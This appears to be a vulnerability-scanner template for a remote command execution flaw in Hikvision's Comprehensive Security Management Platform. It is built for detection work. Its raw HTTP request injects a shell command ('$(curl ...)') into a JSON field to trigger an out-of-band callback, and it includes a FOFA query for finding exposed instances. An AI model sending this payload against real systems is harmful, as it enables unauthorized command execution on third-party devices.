http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  raw:
  - '@timeout: 10s

    POST /center/api/installation/detection;.js HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"type": "environment", "operate": "", "machines": {"id": "$(curl http://{{interactsh-url}})"}}

    '
id: hikvision-csmp-installation-rce
info:
  author: Co5mos
  description: 'Hikvision Comprehensive Security Management Platform historical versions
    have a remote command execution vulnerability due to insufficient validation of
    the installation detection interface. This allows remote attackers to execute
    arbitrary commands.

    '
  metadata:
    fofa-query: app="HIKVISION-iSecure-Center"
  name: Hikvision Comprehensive Security Management Platform Installation RCE
  severity: critical
  tags: rce, hikvision
